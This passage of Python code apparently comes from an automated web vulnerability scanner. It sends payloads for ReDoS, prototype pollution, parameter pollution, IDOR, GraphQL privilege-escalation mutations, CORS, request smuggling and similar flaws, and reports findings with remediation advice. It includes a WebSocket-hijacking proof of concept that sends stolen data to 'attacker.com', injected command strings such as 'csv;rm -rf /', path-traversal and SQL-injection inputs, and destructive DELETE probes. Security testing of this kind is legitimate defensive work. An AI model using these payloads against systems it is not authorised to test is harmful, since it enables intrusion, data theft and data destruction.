                        remediation="Restrict JWKS endpoint to internal networks. Verify jku/x5u headers against a pinned allowlist before fetching keys."
                    ))
            except Exception:
                pass
        return profile

# ── Tool 86: Regex DoS (ReDoS) Probe (SKILL-96) ───────────────
class ReDoSProbe:
    """Send ReDoS payloads to detect catastrophic backtracking in input validation."""
    NAME = "ReDoS Probe"
    REDOS_PAYLOADS = [
        "a" * 30 + "!",
        "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!",
        "((((((((((((((((((((a" * 2,
        "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaab",
        "1" * 50 + "@" + "a" * 50 + ".com",
    ]
    PARAMS = ["email", "username", "search", "q", "query", "name", "phone", "zip"]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        for param in self.PARAMS[:4]:
            for pl in self.REDOS_PAYLOADS[:3]:
                url = profile.url.rstrip("/") + f"/?{param}={pl}"
                import time as _time
                t0 = _time.time()
                try:
                    r = _fetch(url, cfg.ua, 10)
                    elapsed = _time.time() - t0
                    if elapsed > 4.0 and r and r.status == 200:
                        profile.findings.append(Finding(
                            id="REDOS-DETECT",
                            title=f"Potential ReDoS in parameter '{param}' ({elapsed:.1f}s response)",
                            severity="MEDIUM",
                            cvss=5.9,
                            cwe="CWE-1333",
                            description=f"Request with crafted input to '{param}' took {elapsed:.1f}s — may indicate catastrophic regex backtracking.",
                            poc_curl=f"time curl -sk '{url}'",
                            category="DoS",
                            remediation="Replace backtracking-vulnerable regex with possessive quantifiers, atomic groups, or linear-time parsers."
                        ))
                        return profile
                except Exception:
                    pass
        return profile

# ── Tool 87: Dangling DNS / Subdomain Takeover v2 (SKILL-97) ──
class SubdomainTakeoverV2:
    """Extended subdomain takeover checks including CNAME chain analysis."""
    NAME = "Subdomain Takeover V2"
    EXTENDED_FINGERPRINTS = {
        "There isn't a GitHub Pages site here": ("GitHub Pages", "CRITICAL"),
        "Repository not found": ("GitHub", "CRITICAL"),
        "The requested URL was not found on this server": ("Apache/generic", "LOW"),
        "NoSuchBucket": ("AWS S3", "CRITICAL"),
        "fastly error: unknown domain": ("Fastly", "HIGH"),
        "Squarespace 404": ("Squarespace", "HIGH"),
        "Sorry, we could not find the page": ("Webflow", "HIGH"),
        "Project not found": ("GitLab Pages", "CRITICAL"),
        "This domain isn't connected": ("Shopify", "HIGH"),
        "Do you want to register": ("Namecheap parking", "HIGH"),
        "The feed has not been found": ("Tumblr", "MEDIUM"),
        "azure websites": ("Azure Web Apps", "HIGH"),
        "404 Not Found": ("generic-404", "LOW"),
        "domain is not configured": ("Pantheon", "HIGH"),
        "Help Center Closed": ("Zendesk", "HIGH"),
        "is not a registered InCloud YouTrack": ("JetBrains YouTrack", "HIGH"),
    }
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        import socket
        for sub in ["www", "blog", "help", "support", "dev", "staging",
                    "api", "beta", "test", "mail", "cdn", "status"][:8]:
            host = f"{sub}.{profile.apex}"
            try:
                socket.getaddrinfo(host, 80)
            except socket.gaierror:
                profile.findings.append(Finding(
                    id=f"DANGLE-DNS-{sub.upper()}",
                    title=f"Dangling DNS — {host} does not resolve",
                    severity="MEDIUM",
                    cvss=5.4,
                    cwe="CWE-350",
                    description=f"Subdomain {host} has no DNS record. If a CNAME chain points to an unclaimed service, takeover may be possible.",
                    poc_curl=f"dig {host} +short",
                    category="Subdomain Takeover",
                    remediation="Remove stale DNS records. Audit all CNAME targets for unclaimed services."
                ))
                continue
            try:
                r = _fetch(f"https://{host}", cfg.ua, 8)
                if not r:
                    continue
                body = r.body.decode("utf-8", errors="replace") if r.body else ""
                for fp, (provider, sev) in self.EXTENDED_FINGERPRINTS.items():
                    if fp.lower() in body.lower():
                        profile.findings.append(Finding(
                            id=f"TAKEOVER-V2-{sub.upper()}",
                            title=f"Subdomain takeover candidate: {host} ({provider})",
                            severity=sev,
                            cvss=8.1 if sev == "CRITICAL" else 6.4,
                            cwe="CWE-350",
                            description=f"https://{host} shows '{fp[:60]}' — matches {provider} unclaimed fingerprint.",
                            poc_curl=f"curl -sk https://{host} | grep -i '{fp[:30]}'",
                            category="Subdomain Takeover",
                            remediation=f"Claim or remove the {provider} service associated with this subdomain."
                        ))
                        break
            except Exception:
                pass
        return profile

# ── Tool 88: HTTP/2 Rapid Reset Detection (SKILL-98) ──────────
class HTTP2RapidReset:
    """Detect HTTP/2 support and flag CVE-2023-44487 rapid reset risk."""
    NAME = "HTTP/2 Rapid Reset"
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        try:
            import subprocess
            result = subprocess.run(
                ["curl", "-sk", "--http2", "-I", "-w", "%{http_version}", "-o", "/dev/null",
                 profile.url],
                capture_output=True, text=True, timeout=10)
            if "2" in result.stdout:
                profile.findings.append(Finding(
                    id="HTTP2-RAPID-RESET",
                    title="HTTP/2 enabled — assess CVE-2023-44487 (Rapid Reset) exposure",
                    severity="MEDIUM",
                    cvss=7.5,
                    cwe="CWE-400",
                    description="Server supports HTTP/2. Verify it is patched against CVE-2023-44487 (HTTP/2 Rapid Reset DoS). Vulnerable servers can be overwhelmed by RST_STREAM flood.",
                    poc_curl=f"curl -sk --http2 -I {profile.url}",
                    category="DoS",
                    remediation="Update HTTP server to a patched version. Apply h2 connection rate limits. Consider h2c → h1 downgrade for untrusted clients."
                ))
        except Exception:
            pass
        return profile

# ── Tool 89: WebSocket Cross-Site Hijacking (SKILL-99) ────────
class WebSocketHijacking:
    """Detect WebSocket endpoints vulnerable to Cross-Site WebSocket Hijacking."""
    NAME = "WebSocket CSWSH"
    WS_PATHS = ["/ws", "/websocket", "/socket", "/live",
                "/realtime", "/api/ws", "/api/socket",
                "/sockjs/info", "/socket.io/"]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        for path in self.WS_PATHS:
            url = profile.url.rstrip("/") + path
            ws_url = url.replace("https://", "wss://").replace("http://", "ws://")
            try:
                r = _fetch(url, cfg.ua, cfg.timeout,
                           headers_extra={
                               "Upgrade": "websocket",
                               "Connection": "Upgrade",
                               "Sec-WebSocket-Version": "13",
                               "Sec-WebSocket-Key": "dGhlIHNhbXBsZSBub25jZQ==",
                               "Origin": "https://evil.example.com"
                           })
                if r and r.status in (101, 200):
                    profile.findings.append(Finding(
                        id="CSWSH-WS",
                        title=f"WebSocket endpoint may be vulnerable to CSWSH: {path}",
                        severity="HIGH",
                        cvss=8.1,
                        cwe="CWE-346",
                        description=f"WebSocket upgrade at {path} responded {r.status} to a request with evil.example.com Origin header. If no Origin validation, CSWSH is possible.",
                        poc_curl=(
                            f"# Attacker page:\n"
                            f"var ws = new WebSocket('{ws_url}');\n"
                            f"ws.onmessage = e => fetch('https://attacker.com/?d='+btoa(e.data));"
                        ),
                        category="WebSocket",
                        remediation="Validate WebSocket Origin header against same-site allowlist. Require CSRF token in first WebSocket message."
                    ))
            except Exception:
                pass
        return profile

# ── Tool 90: Prototype Pollution Advanced (SKILL-100) ─────────
class PrototypePollutionAdvanced:
    """Advanced prototype pollution via query string, JSON body, and URL-encoded body."""
    NAME = "Prototype Pollution Advanced"
    PP_PAYLOADS_QS = [
        "__proto__[polluted]=apexhunter",
        "constructor[prototype][polluted]=apexhunter",
        "__proto__.polluted=apexhunter",
        "a[__proto__][polluted]=apexhunter",
    ]
    PP_PAYLOADS_JSON = [
        {"__proto__": {"polluted": "apexhunter"}},
        {"constructor": {"prototype": {"polluted": "apexhunter"}}},
    ]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        api_paths = ["/api", "/api/v1", "/api/v2", "/api/search", "/api/query"]
        for path in api_paths[:3]:
            base = profile.url.rstrip("/") + path
            # Query string pollution
            for qs in self.PP_PAYLOADS_QS[:2]:
                url = base + "?" + qs
                try:
                    r = _fetch(url, cfg.ua, cfg.timeout)
                    if r and r.body:
                        body = r.body.decode("utf-8", errors="replace")
                        if "apexhunter" in body:
                            profile.findings.append(Finding(
                                id="PP-ADVANCED-QS",
                                title="Advanced prototype pollution via query string",
                                severity="HIGH",
                                cvss=7.3,
                                cwe="CWE-1321",
                                description=f"Query string {qs} caused 'apexhunter' to appear in response body at {url[:80]}.",
                                poc_curl=f"curl -sk '{url}'",
                                category="Injection",
                                remediation="Freeze Object.prototype. Use Object.create(null) for config objects. Sanitize keys before merge."
                            ))
                            return profile
                except Exception:
                    pass
            # JSON body pollution
            for pl in self.PP_PAYLOADS_JSON:
                try:
                    r = _fetch(base, cfg.ua, cfg.timeout, "POST",
                               json.dumps(pl).encode(),
                               {"Content-Type": "application/json"})
                    if r and r.body:
                        body = r.body.decode("utf-8", errors="replace")
                        if "apexhunter" in body:
                            profile.findings.append(Finding(
                                id="PP-ADVANCED-JSON",
                                title="Advanced prototype pollution via JSON body",
                                severity="HIGH",
                                cvss=7.3,
                                cwe="CWE-1321",
                                description=f"JSON payload {json.dumps(pl)[:80]} caused pollution reflection at {base}.",
                                poc_curl=f"curl -sk -X POST {base} -H 'Content-Type: application/json' -d '{json.dumps(pl)}'",
                                category="Injection",
                                remediation="Freeze Object.prototype. Use structured clone or safe merge libraries. Block __proto__ keys in JSON parsers."
                            ))
                            return profile
                except Exception:
                    pass
        return profile

# ── Tool 91: HTTP Parameter Tampering Advanced (SKILL-101) ────
class HPPAdvanced:
    """Test HTTP Parameter Pollution across REST, multipart, and array notation."""
    NAME = "HPP Advanced"
    HPP_TESTS = [
        ("?id=1&id=2", "duplicate"),
        ("?ids[]=1&ids[]=2", "array_notation"),
        ("?id[0]=1&id[1]=2", "indexed_array"),
        ("?search=a%00b", "null_byte"),
        ("?filter=normal&filter=admin", "filter_override"),
    ]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        api_paths = ["/api/users", "/api/items", "/api/products", "/api/v1/users"]
        for path in api_paths[:3]:
            base = profile.url.rstrip("/") + path
            for qs, label in self.HPP_TESTS[:4]:
                url = base + qs
                try:
                    r = _fetch(url, cfg.ua, cfg.timeout)
                    if not r:
                        continue
                    baseline = _fetch(base + "?id=1", cfg.ua, cfg.timeout)
                    if not baseline:
                        continue
                    if r.status == 200 and r.status != baseline.status:
                        profile.findings.append(Finding(
                            id=f"HPP-{label.upper()}",
                            title=f"HTTP Parameter Pollution ({label}) on {path}",
                            severity="MEDIUM",
                            cvss=5.4,
                            cwe="CWE-235",
                            description=f"Parameter pollution variant '{label}' at {url[:80]} returned {r.status} vs baseline {baseline.status}.",
                            poc_curl=f"curl -sk '{url}'",
                            category="Injection",
                            remediation="Define explicit parsing behavior for duplicate parameters. Reject or take-first/take-last consistently."
                        ))
                except Exception:
                    pass
        return profile

# ── Tool 92: Insecure Direct Object Reference v2 (SKILL-102) ──
class IDORv2:
    """Second-order IDOR via object references in response bodies."""
    NAME = "IDOR v2"
    ID_JSON = re.compile(
        r'"(?:id|user_id|account_id|order_id|doc_id|file_id|uid|uuid)"'
        r'\s*:\s*(?:"([a-zA-Z0-9\-]{4,40})"|(\\d{1,10}))', re.I)
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        api_paths = ["/api/me", "/api/user", "/api/profile",
                     "/api/account", "/api/v1/me"]
        for path in api_paths[:3]:
            url = profile.url.rstrip("/") + path
            try:
                r = _fetch(url, cfg.ua, cfg.timeout)
                if not r or not r.body:
                    continue
                body = r.body.decode("utf-8", errors="replace")
                for m in self.ID_JSON.finditer(body):
                    obj_id = m.group(1) or m.group(2)
                    if not obj_id:
                        continue
                    # Try accessing the object directly
                    guess = profile.url.rstrip("/") + path + "/" + obj_id
                    r2 = _fetch(guess, cfg.ua, cfg.timeout)
                    if r2 and r2.status == 200:
                        profile.findings.append(Finding(
                            id="IDOR-V2-OBJECT",
                            title=f"Second-order IDOR — object ID {obj_id[:20]} directly accessible",
                            severity="HIGH",
                            cvss=7.5,
                            cwe="CWE-639",
                            description=f"ID '{obj_id}' found in {path} response. Direct access via {guess[:80]} returns 200 without auth context verification.",
                            poc_curl=f"curl -sk '{guess}'",
                            category="Access Control",
                            remediation="Implement object-level authorization on every endpoint. Use opaque references + server-side ownership checks."
                        ))
                        break
            except Exception:
                pass
        return profile

# ── Tool 93: Forced Browsing / Unlinked Pages (SKILL-103) ─────
class ForcedBrowsing:
    """Discover unlinked admin/backup/config pages via targeted brute-force."""
    NAME = "Forced Browsing"
    PATHS = [
        "/admin.php", "/admin.html", "/admin/login", "/administrator",
        "/wp-admin", "/wp-login.php", "/phpmyadmin", "/pma",
        "/backup", "/backup.zip", "/backup.tar.gz", "/db_backup.sql",
        "/config.php", "/config.bak", "/web.config", "/app.config",
        "/.git/HEAD", "/.svn/entries", "/.env.bak", "/.env.backup",
        "/server-status", "/server-info", "/nginx_status", "/status.php",
        "/install.php", "/setup.php", "/upgrade.php", "/update.php",
        "/test.php", "/info.php", "/phpinfo.php", "/debug.php",
        "/cgi-bin/test.cgi", "/cgi-bin/printenv", "/cgi-bin/env",
    ]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        for path in self.PATHS:
            url = profile.url.rstrip("/") + path
            try:
                r = _fetch(url, cfg.ua, cfg.timeout)
                if not r or r.status not in (200, 403):
                    continue
                body_s = (r.body or b"").decode("utf-8", errors="replace")
                sev = "HIGH" if r.status == 200 else "MEDIUM"
                is_interesting = any(k in body_s.lower() for k in [
                    "phpinfo", "database", "password", "config", "backup",
                    "ref:", "HEAD", "svn", "admin", "root"]) or r.status == 200
                if is_interesting:
                    profile.findings.append(Finding(
                        id=f"FORCED-BROWSE-{path.replace('/', '_')[:20].upper()}",
                        title=f"Unlinked page accessible: {path}",
                        severity=sev,
                        cvss=6.5 if sev == "HIGH" else 4.3,
                        cwe="CWE-425",
                        description=f"Direct request to {url} returned HTTP {r.status}. Content preview: {body_s[:80]}",
                        poc_curl=f"curl -sk {url}",
                        category="Information Disclosure",
                        remediation="Remove backup/debug/install files from production. Add authentication to admin paths. Return 404 (not 403) for hidden resources."
                    ))
            except Exception:
                pass
        return profile

# ── Tool 94: Sensitive Data in API Responses (SKILL-104) ──────
class SensitiveDataExposure:
    """Scan API responses for PII, credentials, keys, and internal IPs."""
    NAME = "Sensitive Data Exposure"
    PII_PATTERNS = [
        (re.compile(r'\b[A-Z]{2,3}\d{6,10}\b'), "Passport/ID number"),
        (re.compile(r'\b\d{4}[-\s]\d{4}[-\s]\d{4}[-\s]\d{4}\b'), "Credit card pattern"),
        (re.compile(r'\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14})\b'), "Credit card number"),
        (re.compile(r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'), "Email address"),
        (re.compile(r'\b(?:10|172\.(?:1[6-9]|2[0-9]|3[01])|192\.168)\.\d+\.\d+\b'), "RFC1918 internal IP"),
        (re.compile(r'(?:password|passwd|pwd)\s*[=:]\s*[^\s\'"&]{4,}', re.I), "Plaintext password"),
        (re.compile(r'-----BEGIN (?:RSA |EC |OPENSSH )?PRIVATE KEY-----'), "Private key"),
        (re.compile(r'(?:AKIA|ASIA|AROA|AIPA|ANPA|ANVA|AIDA)[A-Z0-9]{16}'), "AWS Access Key"),
    ]
    API_PATHS = ["/api/users", "/api/user", "/api/me", "/api/profile",
                 "/api/account", "/api/admin/users", "/api/v1/users",
                 "/api/orders", "/api/payments", "/api/transactions"]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        for path in self.API_PATHS[:6]:
            url = profile.url.rstrip("/") + path
            try:
                r = _fetch(url, cfg.ua, cfg.timeout)
                if not r or not r.body or r.status not in (200,):
                    continue
                body = r.body.decode("utf-8", errors="replace")
                for pat, label in self.PII_PATTERNS:
                    m = pat.search(body)
                    if m:
                        val = m.group(0)[:30]
                        profile.findings.append(Finding(
                            id=f"PII-EXPOSE-{label.replace(' ', '_').upper()[:15]}",
                            title=f"Sensitive data in API response: {label}",
                            severity="HIGH",
                            cvss=7.5,
                            cwe="CWE-359",
                            description=f"{label} found in {path} response. Sample: {val}... Unauthenticated endpoint exposes PII.",
                            poc_curl=f"curl -sk {url} | python3 -m json.tool | grep -iE 'email|password|card|key'",
                            category="Data Exposure",
                            remediation="Apply field-level response filtering. Remove PII from unauthenticated endpoints. Encrypt sensitive fields at rest."
                        ))
                        break
            except Exception:
                pass
        return profile

# ── Tool 95: Broken Function-Level Authorization (SKILL-105) ──
class BFLAScanner:
    """Test Broken Function Level Authorization — access privileged functions without admin role."""
    NAME = "BFLA Scanner"
    ADMIN_FUNCS = [
        ("DELETE", "/api/users/1"),
        ("DELETE", "/api/admin/users/1"),
        ("PUT", "/api/users/1/role"),
        ("PATCH", "/api/users/1"),
        ("POST", "/api/admin/users"),
        ("GET", "/api/admin/users"),
        ("GET", "/api/admin/logs"),
        ("GET", "/api/admin/config"),
        ("DELETE", "/api/items/1"),
        ("PUT", "/api/admin/settings"),
    ]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        for method, path in self.ADMIN_FUNCS[:8]:
            url = profile.url.rstrip("/") + path
            try:
                payload = b'{"role":"user"}' if method in ("PUT","PATCH","POST") else None
                headers = {"Content-Type": "application/json"} if payload else {}
                r = _fetch(url, cfg.ua, cfg.timeout, method, payload, headers)
                if r and r.status not in (401, 403, 404, 405):
                    profile.findings.append(Finding(
                        id=f"BFLA-{method}-{path.replace('/','_')[:15].upper()}",
                        title=f"BFLA — {method} {path} accessible without admin role",
                        severity="HIGH",
                        cvss=8.1,
                        cwe="CWE-285",
                        description=f"{method} {path} returned HTTP {r.status} for unauthenticated/low-privilege request. Privileged function may be exposed.",
                        poc_curl=f"curl -sk -X {method} {url}" + (f" -d '{payload.decode()}'" if payload else ""),
                        category="Access Control",
                        remediation="Enforce function-level authorization checks on every endpoint. Validate role/permission server-side for every request."
                    ))
            except Exception:
                pass
        return profile

# ── Tool 96: GraphQL Mutation Fuzzer (SKILL-106) ─────────────
class GraphQLMutationFuzzer:
    """Fuzz GraphQL mutations for mass create, privilege escalation, and injection."""
    NAME = "GraphQL Mutation Fuzzer"
    MUTATIONS = [
        '{"query":"mutation{createUser(input:{username:\\"admin\\",password:\\"pass123\\",role:\\"admin\\"}){id}}"}',
        '{"query":"mutation{updateUser(id:1,input:{role:\\"admin\\"}){id role}}"}',
        '{"query":"mutation{deleteUser(id:1){success}}"}',
        '{"query":"mutation{__typename}"}',
    ]
    GQL_PATHS = ["/graphql", "/api/graphql", "/gql", "/query"]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        for ep in self.GQL_PATHS:
            url = profile.url.rstrip("/") + ep
            for mutation in self.MUTATIONS:
                try:
                    r = _fetch(url, cfg.ua, cfg.timeout, "POST",
                               mutation.encode(),
                               {"Content-Type": "application/json"})
                    if not r or not r.body:
                        continue
                    body = r.body.decode("utf-8", errors="replace")
                    if "errors" not in body and ('"id"' in body or '"success"' in body):
                        m_label = mutation[10:50].replace('"','').replace('\\','')
                        profile.findings.append(Finding(
                            id="GQL-MUTATION-FUZZ",
                            title=f"GraphQL mutation succeeded without authorization: {m_label[:40]}",
                            severity="CRITICAL",
                            cvss=9.1,
                            cwe="CWE-285",
                            description=f"GraphQL mutation at {ep} succeeded with data: {body[:100]}",
                            poc_curl=f"curl -sk -X POST {url} -H 'Content-Type: application/json' -d '{mutation}'",
                            category="GraphQL",
                            remediation="Enforce authentication and authorization checks on all GraphQL mutations. Use persisted queries in production."
                        ))
                        return profile
                except Exception:
                    pass
        return profile

# ── Tool 97: Insecure CORS on API (SKILL-107) ─────────────────
class InsecureCORSOnAPI:
    """Detect API endpoints that reflect arbitrary Origin with CORS allow."""
    NAME = "Insecure CORS on API"
    EVIL_ORIGINS = [
        "https://evil.example.com",
        "null",
        "https://trusteddomain.com.evil.com",
        "http://localhost",
    ]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        api_paths = ["/api", "/api/v1", "/api/v2", "/api/me",
                     "/api/user", "/api/profile", "/api/data"]
        for path in api_paths[:5]:
            url = profile.url.rstrip("/") + path
            for origin in self.EVIL_ORIGINS:
                try:
                    r = _fetch(url, cfg.ua, cfg.timeout,
                               headers_extra={"Origin": origin})
                    if not r:
                        continue
                    acao = r.headers.get("access-control-allow-origin", "")
                    if acao and (acao == origin or acao == "*"):
                        acac = r.headers.get("access-control-allow-credentials", "")
                        sev = "CRITICAL" if "true" in acac.lower() else "HIGH"
                        profile.findings.append(Finding(
                            id=f"CORS-REFLECT-API",
                            title=f"API reflects arbitrary Origin in ACAO header: {path}",
                            severity=sev,
                            cvss=9.0 if sev == "CRITICAL" else 7.4,
                            cwe="CWE-942",
                            description=f"Sent Origin: {origin} to {path}, got ACAO: {acao}, ACAC: {acac}.",
                            poc_curl=(
                                f"curl -sk {url} -H 'Origin: {origin}' -v 2>&1 | "
                                f"grep -i 'access-control'"
                            ),
                            category="CORS",
                            remediation="Use a strict Origin allowlist. Never reflect the Origin header dynamically. Remove CORS headers from non-public APIs."
                        ))
                        return profile
                except Exception:
                    pass
        return profile

# ── Tool 98: SSL Pinning Bypass Hints (SKILL-108) ────────────
class SSLPinningBypassHints:
    """Detect certificate transparency logs, old cert fingerprints, and pinning hints."""
    NAME = "SSL Pinning Bypass Hints"
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        try:
            import ssl, socket
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            host = profile.host
            port = 443
            with socket.create_connection((host, port), timeout=10) as sock:
                with ctx.wrap_socket(sock, server_hostname=host) as ssock:
                    cert = ssock.getpeercert(binary_form=True)
                    import hashlib
                    sha256 = hashlib.sha256(cert).hexdigest()
                    sha1 = hashlib.sha1(cert).hexdigest()
                    der_cert = ssock.getpeercert()
                    issued_to = der_cert.get("subject", ((("commonName","?"),),))[0][0][1]
                    issuer = str(der_cert.get("issuer","?"))
                    not_after = der_cert.get("notAfter", "?")
                    profile.findings.append(Finding(
                        id="SSL-PIN-HINTS",
                        title=f"SSL certificate fingerprints (for pinning bypass research)",
                        severity="INFO",
                        cvss=0.0,
                        cwe="CWE-295",
                        description=(f"CN={issued_to} | Issuer={issuer[:60]} | Expires={not_after}\n"
                                     f"SHA-256: {sha256}\nSHA-1: {sha1}"),
                        poc_curl=(f"# Add to Frida/objection pinning bypass:\n"
                                  f"# openssl s_client -connect {host}:443 </dev/null 2>/dev/null | "
                                  f"openssl x509 -fingerprint -sha256"),
                        category="TLS",
                        remediation="Implement certificate pinning with backup pins. Rotate pins with 60-day lead time."
                    ))
        except Exception:
            pass
        return profile

# ── Tool 99: GraphQL Field Suggestion Leak (SKILL-109) ────────
class GraphQLFieldSuggestionLeak:
    """Exploit GraphQL field name suggestion to enumerate hidden schema fields."""
    NAME = "GraphQL Field Suggestion Leak"
    GQL_PATHS = ["/graphql", "/api/graphql", "/gql", "/query"]
    TYPOS = [
        '{"query":"{userss{id}}"}',
        '{"query":"{adminUser{id}}"}',
        '{"query":"{User{id}}"}',
        '{"query":"{account{id}}"}',
        '{"query":"{profil{id}}"}',
    ]
    SUGGEST_PAT = re.compile(r'Did you mean[^"]*"([^"]+)"', re.I)
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        for ep in self.GQL_PATHS:
            url = profile.url.rstrip("/") + ep
            suggested = set()
            for typo in self.TYPOS:
                try:
                    r = _fetch(url, cfg.ua, cfg.timeout, "POST",
                               typo.encode(), {"Content-Type": "application/json"})
                    if not r or not r.body:
                        continue
                    body = r.body.decode("utf-8", errors="replace")
                    for m in self.SUGGEST_PAT.finditer(body):
                        suggested.add(m.group(1))
                except Exception:
                    pass
            if suggested:
                profile.findings.append(Finding(
                    id="GQL-FIELD-SUGGEST",
                    title=f"GraphQL field suggestion leaks schema: {', '.join(list(suggested)[:5])}",
                    severity="MEDIUM",
                    cvss=5.3,
                    cwe="CWE-209",
                    description=f"GraphQL 'Did you mean?' suggestions exposed hidden field names at {ep}: {suggested}",
                    poc_curl=f"curl -sk -X POST {url} -H 'Content-Type: application/json' -d '{self.TYPOS[0]}'",
                    category="GraphQL",
                    remediation="Disable field suggestion in production GraphQL engines (e.g., Apollo Server: `introspection: false, fieldSuggestions: false`)."
                ))
        return profile

# ── Tool 100: Dependency Confusion v2 (SKILL-110) ────────────
class DependencyConfusionV2:
    """Extended dependency confusion: pypi, rubygems, maven, npm scoped packages."""
    NAME = "Dependency Confusion V2"
    PKG_PATTERNS = {
        "npm_scoped": re.compile(r'"name"\s*:\s*"(@[a-z0-9_-]+/[a-z0-9_-]+)"'),
        "npm_internal": re.compile(r'"(?:dependencies|devDependencies)"\s*:\s*\{([^}]+)\}'),
        "requirements": re.compile(r'^([a-zA-Z0-9_-]+)==', re.M),
        "gemspec": re.compile(r's\.add_(?:runtime|development)_dependency\s+["\']([^"\']+)["\']'),
    }
    PUBLIC_PATHS = ["/package.json", "/package-lock.json", "/yarn.lock",
                    "/requirements.txt", "/Gemfile", "/Gemfile.lock",
                    "/pom.xml", "/build.gradle", "/composer.json",
                    "/setup.py", "/pyproject.toml"]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        for path in self.PUBLIC_PATHS:
            url = profile.url.rstrip("/") + path
            try:
                r = _fetch(url, cfg.ua, cfg.timeout)
                if not r or r.status != 200 or not r.body:
                    continue
                body = r.body.decode("utf-8", errors="replace")
                for ptype, pat in self.PKG_PATTERNS.items():
                    matches = pat.findall(body)
                    if matches:
                        pkgs = [m if isinstance(m, str) else m[:40] for m in matches[:5]]
                        profile.findings.append(Finding(
                            id=f"DEP-CONF-V2-{ptype.upper()}",
                            title=f"Dependency manifest exposed with internal packages: {path}",
                            severity="MEDIUM",
                            cvss=5.9,
                            cwe="CWE-427",
                            description=f"File {url} exposed {ptype} package names: {pkgs}. Test if these exist on public registries.",
                            poc_curl=f"curl -sk {url} | grep -E 'name|depend|require'",
                            category="Supply Chain",
                            remediation="Block access to dependency manifests. Use scope namespacing. Configure private registry with NO public fallback."
                        ))
                        break
            except Exception:
                pass
        return profile

# ── Tool 101: Improper Error Handling (SKILL-111) ─────────────
class ImproperErrorHandling:
    """Trigger verbose errors via malformed inputs and type confusion."""
    NAME = "Improper Error Handling"
    ERROR_PROBES = [
        ("?id=", ["' OR 1=1--", "../../../../etc/passwd", "<script>", "${7*7}", "{{7*7}}"]),
        ("?page=", ["-1", "null", "9999999999", "NaN", "undefined"]),
        ("?format=", ["json'", "xml%00", "csv;rm -rf /", "\\x00", "{{7}}"]),
    ]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        ERROR_PAT = re.compile(
            r'(?:stack trace|at [\w\.<>]+\(|exception|error in|'
            r'syntax error|undefined method|java\.lang\.|'
            r'microsoft\.visualbasic\.|system\.web\.|traceback)', re.I)
        for param_prefix, payloads in self.ERROR_PROBES:
            for pl in payloads[:3]:
                url = profile.url.rstrip("/") + "/" + param_prefix + pl
                try:
                    r = _fetch(url, cfg.ua, cfg.timeout)
                    if not r or not r.body:
                        continue
                    body = r.body.decode("utf-8", errors="replace")
                    m = ERROR_PAT.search(body)
                    if m and r.status >= 400:
                        profile.findings.append(Finding(
                            id="ERROR-VERBOSE",
                            title="Verbose error message / stack trace disclosed",
                            severity="MEDIUM",
                            cvss=5.3,
                            cwe="CWE-209",
                            description=f"Input '{pl}' to {param_prefix} triggered verbose error. Snippet: {body[max(0,m.start()-30):m.start()+80]}",
                            poc_curl=f"curl -sk '{url}'",
                            category="Information Disclosure",
                            remediation="Configure generic error pages. Log verbose errors server-side only. Never expose stack traces to clients."
                        ))
                        return profile
                except Exception:
                    pass
        return profile

# ── Tool 102: HTTP Desync Frontend-Backend (SKILL-112) ────────
class HTTPDesyncAdvanced:
    """Detect HTTP desync via differential timing between CL and TE handling."""
    NAME = "HTTP Desync Advanced"
    DESYNC_PROBES = [
        # CL.TE: body has Transfer-Encoding chunk after Content-Length
        {
            "method": "POST",
            "headers": {
                "Content-Length": "4",
                "Transfer-Encoding": "chunked",
                "Content-Type": "application/x-www-form-urlencoded",
            },
            "body": b"0\r\n\r\n",
        },
        # TE.CL: multiple TE headers
        {
            "method": "POST",
            "headers": {
                "Content-Length": "6",
                "Transfer-Encoding": "chunked",
                "Transfer-Encoding": "cow",
            },
            "body": b"3\r\nGET\r\n0\r\n\r\n",
        },
    ]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        for probe in self.DESYNC_PROBES:
            try:
                r = _fetch(profile.url, cfg.ua, 8,
                           probe["method"], probe["body"],
                           probe["headers"])
                if r and r.status == 200:
                    profile.findings.append(Finding(
                        id="DESYNC-ADVANCED",
                        title="HTTP request desync — server accepted ambiguous CL+TE",
                        severity="HIGH",
                        cvss=8.1,
                        cwe="CWE-444",
                        description="Server accepted conflicting Content-Length and Transfer-Encoding headers. Potential HTTP request smuggling (advanced CL.TE/TE.CL variant).",
                        poc_curl=(
                            f"curl -sk -X POST {profile.url} "
                            f"-H 'Content-Length: 4' -H 'Transfer-Encoding: chunked' "
                            f"--data-binary $'0\\r\\n\\r\\n'"
                        ),
                        category="HTTP Smuggling",
                        remediation="Normalize requests at reverse proxy layer. Reject conflicting CL+TE headers. Enable HTTP/2 end-to-end."
                    ))
                    return profile
            except Exception:
                pass
        return profile

# ── Tool 103: OAuth State CSRF (SKILL-113) ────────────────────
class OAuthStateCSRF:
    """Detect missing, reused, or guessable OAuth state parameter."""
    NAME = "OAuth State CSRF"
    AUTH_PATHS = ["/oauth/authorize", "/oauth2/authorize", "/auth/oauth",
                  "/connect/authorize", "/api/oauth/authorize"]
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        for path in self.AUTH_PATHS:
            url = profile.url.rstrip("/") + path
            # No state param
            probe1 = url + "?response_type=code&client_id=test&redirect_uri=http://localhost"
